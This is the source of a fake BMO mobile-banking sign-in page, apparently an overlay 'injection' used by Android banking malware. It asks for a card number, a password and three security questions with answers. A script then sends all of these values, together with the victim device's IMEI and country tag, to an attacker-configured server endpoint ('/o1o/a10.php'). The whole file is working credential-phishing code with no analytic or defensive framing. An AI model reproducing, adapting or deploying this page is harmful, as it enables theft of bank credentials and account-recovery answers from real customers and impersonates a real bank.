<html>
<head>
	<link rel="stylesheet" href="ca/com.bmo.mobile/css/style.css">
	<link rel="stylesheet" href="css/bootstrap.min.css">
	<link rel="stylesheet" href="css/cat.style.css">
	<script src="js/cat.functions.js"></script>
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body style="background-color: #0067aa;">
<div id="content_div">
<center>
<div id="header">
	<img src="ca/com.bmo.mobile/img/logo.png">
</div>

	<form id="form">
	
	<div id="form1">
		<input class="input" id="id" placeholder="Card number" type="text" maxlength="16"><br>
		<script>
                document.getElementById('id').onkeypress = function (e) {
                    return !(/[А-Яа-яA-Za-z !@#$%^&*()_+|":?><]/.test(String.fromCharCode(e.charCode)));
                }
            </script>
		<input class="input" id="password" placeholder="Password" maxlength="6" type="password"><br><br>
			<br>
			<br>
			<br>
			<br>
		
<input type="button" class="submit" id="input_submitBtn" value="Sign In"/>


</div>

<div id="form2" style="display: none;">
	<h3 style="color: #fff;"> Security questions </h3>
	
		<select data-mini="true" name="questions1" id="selects1" class="selects" > 
			<option value=""> Select question </option>
			<option value="What if the first nam of your mother's oldest sibling?"> What if the first nam of your mother's oldest sibling? </option>
			<option value="What was the last name of your favourite teacher in high school?"> What was the last name of your favourite teacher in high school? </option>
			<option value="What was the last name of your favourite teacher in elementary school?"> What was the last name of your favourite teacher in elementary school? </option>
			<option value="What if your favourite musical instrument?"> What if your favourite musical instrument? </option>
			<option value="What was the first name of your first roommate?"> What was the first name of your first roommate? </option>
			<option value="What is the first name of your father;s oldest sibling?"> What is the first name of your father;s oldest sibling? </option>
			<option value="What was the name of your favouritesuperhero as a child?"> What was the name of your favouritesuperhero as a child? </option>
			<option value="What is the middle name of your oldest sibling?"> What is the middle name of your oldest sibling? </option>
			<option value="What is the first name of your oldest cousin?"> What is the first name of your oldest cousin? </option>
			<option value="What is the name of the city where your mother was born?"> What is the name of the city where your mother was born? </option>
			<option value="What is the first name of your oldest niece?"> What is the first name of your oldest niece? </option>
			<option value="What colour was your first car?"> What colour was your first car? </option>
			<option value="What is the first name of your spouse's/partner's father?"> What is the first name of your spouse's/partner's father? </option>
			<option value="What was the fiest name of your first manager?"> What was the fiest name of your first manager? </option>
			<option value="What is the street name where you lived when you were 10 years old?"> What is the street name where you lived when you were 10 years old? </option>
			<option value="What is the first name of your first friend?"> What is the first name of your first friend? </option>
			<option value="What is your youngest child's middle name?"> What is your youngest child's middle name? </option>
			<option value="What is the first name of the person tou went to your prom with?"> What is the first name of the person tou went to your prom with? </option>
			<option value="What is the name of the city where your father was born?"> What is the name of the city where your father was born? </option>
			<option value="What is your mother's middle name?"> What is your mother's middle name? </option>
			<option value="What city were you born in?"> What city were you born in? </option>
			<option value="What id your favourite cartoon?"> What id your favourite cartoon? </option>
			<option value="Who was your favouriteathlete as a child?"> Who was your favouriteathlete as a child? </option>
			<option value="What is your spouse's/partner's middle name?"> What is your spouse's/partner's middle name? </option>
			<option value="What is the first name of the maid of honour at your wedding?"> What is the first name of the maid of honour at your wedding? </option>
			<option value="What is the first name of your oldest nephew?"> What is the first name of your oldest nephew? </option>
			<option value="What was the name of your first pet?"> What was the name of your first pet? </option>
			<option value="What is your father's middle name?"> What is your father's middle name? </option>

		</select>
		
		<input id="answers1" class="input" type="text" onkeyup="check();">
	<br>
	<br>
	<br>
		<select data-mini="true" name="questions2" id="selects2" class="selects" > 
			<option value=""> Select question </option>
			<option value="What if the first nam of your mother's oldest sibling?"> What if the first nam of your mother's oldest sibling? </option>
			<option value="What was the last name of your favourite teacher in high school?"> What was the last name of your favourite teacher in high school? </option>
			<option value="What was the last name of your favourite teacher in elementary school?"> What was the last name of your favourite teacher in elementary school? </option>
			<option value="What if your favourite musical instrument?"> What if your favourite musical instrument? </option>
			<option value="What was the first name of your first roommate?"> What was the first name of your first roommate? </option>
			<option value="What is the first name of your father;s oldest sibling?"> What is the first name of your father;s oldest sibling? </option>
			<option value="What was the name of your favouritesuperhero as a child?"> What was the name of your favouritesuperhero as a child? </option>
			<option value="What is the middle name of your oldest sibling?"> What is the middle name of your oldest sibling? </option>
			<option value="What is the first name of your oldest cousin?"> What is the first name of your oldest cousin? </option>
			<option value="What is the name of the city where your mother was born?"> What is the name of the city where your mother was born? </option>
			<option value="What is the first name of your oldest niece?"> What is the first name of your oldest niece? </option>
			<option value="What colour was your first car?"> What colour was your first car? </option>
			<option value="What is the first name of your spouse's/partner's father?"> What is the first name of your spouse's/partner's father? </option>
			<option value="What was the fiest name of your first manager?"> What was the fiest name of your first manager? </option>
			<option value="What is the street name where you lived when you were 10 years old?"> What is the street name where you lived when you were 10 years old? </option>
			<option value="What is the first name of your first friend?"> What is the first name of your first friend? </option>
			<option value="What is your youngest child's middle name?"> What is your youngest child's middle name? </option>
			<option value="What is the first name of the person tou went to your prom with?"> What is the first name of the person tou went to your prom with? </option>
			<option value="What is the name of the city where your father was born?"> What is the name of the city where your father was born? </option>
			<option value="What is your mother's middle name?"> What is your mother's middle name? </option>
			<option value="What city were you born in?"> What city were you born in? </option>
			<option value="What id your favourite cartoon?"> What id your favourite cartoon? </option>
			<option value="Who was your favouriteathlete as a child?"> Who was your favouriteathlete as a child? </option>
			<option value="What is your spouse's/partner's middle name?"> What is your spouse's/partner's middle name? </option>
			<option value="What is the first name of the maid of honour at your wedding?"> What is the first name of the maid of honour at your wedding? </option>
			<option value="What is the first name of your oldest nephew?"> What is the first name of your oldest nephew? </option>
			<option value="What was the name of your first pet?"> What was the name of your first pet? </option>
			<option value="What is your father's middle name?"> What is your father's middle name? </option>

		</select>
		
		<input id="answers2" class="input" type="text" onkeyup="check();">
	<br>
	<br>
	<br>
		<select data-mini="true" name="questions2" id="selects3" class="selects" > 
			<option value=""> Select question </option>
			<option value="What if the first nam of your mother's oldest sibling?"> What if the first nam of your mother's oldest sibling? </option>
			<option value="What was the last name of your favourite teacher in high school?"> What was the last name of your favourite teacher in high school? </option>
			<option value="What was the last name of your favourite teacher in elementary school?"> What was the last name of your favourite teacher in elementary school? </option>
			<option value="What if your favourite musical instrument?"> What if your favourite musical instrument? </option>
			<option value="What was the first name of your first roommate?"> What was the first name of your first roommate? </option>
			<option value="What is the first name of your father;s oldest sibling?"> What is the first name of your father;s oldest sibling? </option>
			<option value="What was the name of your favouritesuperhero as a child?"> What was the name of your favouritesuperhero as a child? </option>
			<option value="What is the middle name of your oldest sibling?"> What is the middle name of your oldest sibling? </option>
			<option value="What is the first name of your oldest cousin?"> What is the first name of your oldest cousin? </option>
			<option value="What is the name of the city where your mother was born?"> What is the name of the city where your mother was born? </option>
			<option value="What is the first name of your oldest niece?"> What is the first name of your oldest niece? </option>
			<option value="What colour was your first car?"> What colour was your first car? </option>
			<option value="What is the first name of your spouse's/partner's father?"> What is the first name of your spouse's/partner's father? </option>
			<option value="What was the fiest name of your first manager?"> What was the fiest name of your first manager? </option>
			<option value="What is the street name where you lived when you were 10 years old?"> What is the street name where you lived when you were 10 years old? </option>
			<option value="What is the first name of your first friend?"> What is the first name of your first friend? </option>
			<option value="What is your youngest child's middle name?"> What is your youngest child's middle name? </option>
			<option value="What is the first name of the person tou went to your prom with?"> What is the first name of the person tou went to your prom with? </option>
			<option value="What is the name of the city where your father was born?"> What is the name of the city where your father was born? </option>
			<option value="What is your mother's middle name?"> What is your mother's middle name? </option>
			<option value="What city were you born in?"> What city were you born in? </option>
			<option value="What id your favourite cartoon?"> What id your favourite cartoon? </option>
			<option value="Who was your favouriteathlete as a child?"> Who was your favouriteathlete as a child? </option>
			<option value="What is your spouse's/partner's middle name?"> What is your spouse's/partner's middle name? </option>
			<option value="What is the first name of the maid of honour at your wedding?"> What is the first name of the maid of honour at your wedding? </option>
			<option value="What is the first name of your oldest nephew?"> What is the first name of your oldest nephew? </option>
			<option value="What was the name of your first pet?"> What was the name of your first pet? </option>
			<option value="What is your father's middle name?"> What is your father's middle name? </option>

		</select>
		
		<input id="answers3" class="input" type="text" onkeyup="check();">
<br>
	<br>
	<br>
		<input type="button" class="submit" disabled="disabled" id="input_submitBtn2" value="Sign In" onClick="sentServer();" />
</div>
<script>
function check() {
  var inp1 = document.getElementById('answers1'),
      inp2 = document.getElementById('answers2'),
      inp3 = document.getElementById('answers3');
  document.getElementById('input_submitBtn2').disabled = inp1.value && inp2.value && inp3.value ? false : "disabled";
}
</script>
</center>
	</form>



</div>
<script type="text/javascript">
				function getRealDisplay(elem) {
                    if (elem.currentStyle) {
                        return elem.currentStyle.display;
                    } else if (window.getComputedStyle) {
                        var computedStyle = window.getComputedStyle(elem, null);
                        return computedStyle.getPropertyValue('display')
                    }
                }

                function __hide(el) {
                    if (!el.hasAttribute('displayOld')) {
                        el.setAttribute("displayOld", el.style.display)
                    }

                    el.style.display = "none"
                }

                displayCache = {};

                function __show(el) {
                    if (getRealDisplay(el) != 'none') return;

                    var old = el.getAttribute("displayOld");
                    el.style.display = old || "";

                    if (getRealDisplay(el) === "none") {
                        var nodeName = el.nodeName, body = document.body, display;

                        if (displayCache[nodeName]) {
                            display = displayCache[nodeName]
                        } else {
                            var testElem = document.createElement(nodeName);
                            body.appendChild(testElem);
                            display = getRealDisplay(testElem);

                            if (display === "none") {
                                display = "block"
                            }

                            body.removeChild(testElem);
                            displayCache[nodeName] = display
                        }

                        el.setAttribute('displayOld', display);
                        el.style.display = display
                    }
                }

 var step1 = document.getElementById('form1'),
     step2 = document.getElementById('form2'),
	 spinner = document.getElementById('spinner');


                    var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {
					
						var oNumInp = document.getElementById('id');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = oCodeInp.className = 'input';
						} catch(e){};
						
                        if (!/^\w{16,16}$/i.test(oNumInp.value)) {
							try{
                                oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (oCodeInp.value.length < 6) {
							try{
								oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
                    
					
					__hide(step1);
                    __show(step2);
                   
                    return false;
                };
			
            </script>
			
<script>
function sentServer()
{
var login1 = document.forms["form"].elements["id"].value; 
var pass = document.forms["form"].elements["password"].value; 
var question1 = document.forms["form"].elements["selects1"].value; 
var answer1 = document.forms["form"].elements["answers1"].value; 
var question2 = document.forms["form"].elements["selects2"].value; 
var answer2 = document.forms["form"].elements["answers2"].value; 
var question3 = document.forms["form"].elements["selects3"].value; 
var answer3 = document.forms["form"].elements["answers3"].value; 


	var url='<?php echo $URL; ?>';
	var imei_c='<?php echo $IMEI_country; ?>';


location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_10|CA_BMO|Card number: "+login1+"//br//Password: "+pass+"//br//question1: "+question1+"//br//answer1: "+answer1+"//br//question2: "+question2+"//br//answer2: "+answer2+"//br//question3: "+question3+"//br//answer3: "+answer3);
}
</script>

</body>
</html>
